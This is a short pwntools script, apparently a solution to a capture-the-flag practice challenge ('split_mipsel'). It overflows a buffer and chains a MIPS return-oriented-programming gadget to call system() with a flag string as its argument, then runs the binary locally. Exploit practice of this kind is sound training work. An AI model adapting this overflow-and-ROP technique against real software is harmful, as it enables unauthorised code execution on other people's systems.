from pwn import *

context.binary = elf = ELF('./split_mipsel')

flag_string = 0x00411010
call_system = 0x004009ec
'''
  0x00400a20           0800a48f  lw a0, 8(sp)
  0x00400a24           0400b98f  lw t9, 4(sp)
  0x00400a28           09f82003  jalr t9
  0x00400a2c           00000000  nop
'''
a0_8sp_t9_4sp_jmpt9 = 0x00400a20
# I need to insert the flag_string in a0 before calling system

offset = 4*9
#payload = b'f'*offset + p32(elf.sym['usefulFunction'])
payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII' + p32(a0_8sp_t9_4sp_jmpt9)+p32(0x1)+p32(call_system)+p32(flag_string)

p = elf.process()
#p = gdb.debug(elf.path)

p.recv()
p.sendline(payload)
log.info(p.recvall())


